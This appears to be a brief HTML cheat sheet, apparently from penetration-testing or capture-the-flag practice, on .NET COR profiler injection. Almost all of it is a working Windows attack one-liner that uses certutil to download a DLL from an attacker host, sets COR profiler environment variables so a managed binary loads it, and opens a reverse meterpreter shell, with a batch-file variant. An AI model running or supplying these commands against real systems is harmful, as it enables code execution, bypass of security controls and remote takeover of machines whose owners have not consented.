<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>COR_PROFILE Injection</title>
</head><body>https://www.hackplayers.com/2018/12/english-cor-profilers-bypassing-windows.html<br/>
<br/>
certutil -urlcache -split -f http://10.10.14.30/Beryllium.dll C:\programdata\winter.dll &amp;&amp; set "COR_ENABLE_PROFILING=1" &amp;&amp; set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" &amp;&amp; set "COR_PROFILER_PATH=C:\programdata\winter.dll" &amp;&amp; set "IP=10.10.14.30" &amp;&amp; set "PORT=443" &amp;&amp; tzsync<br/>
<br/>
<span style="font-family: verdana"><div style="text-align: left">The oneliner does the following:</div></span><ul><li>With certutil, we upload the DLL to C:\ProgramData\</li>
<li>We set the profiler env vars.</li>
<li>We set IP and PORT to get our reverse meterpreter.</li>
<li>Finally, we execute a binary that creates a managed process --&gt; tzsync.</li>
</ul>
&nbsp;<br/>
And.. Voila!!<br/>
<br/>
<br/>
<br/>
<br/>
Alternatively, you can stick this in a .bat file or otherwise:<br/>
echo set "COR_ENABLE_PROFILING=1" &gt; file.bat<br/>
echo set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" &gt;&gt; file.bat<br/>
echo set "COR_PROFILER_PATH=C:\programdata\MY_DLL.dll" &gt;&gt; file.bat<br/>
echo set "IP=&lt;LHOST&gt;" &gt;&gt; file.bat<br/>
echo set "PORT=&lt;LPORT&gt;" &gt;&gt; file.bat<br/>
echo "tzsync" &gt;&gt; file.bat<br/>
cmd &lt; file.bat</body></html>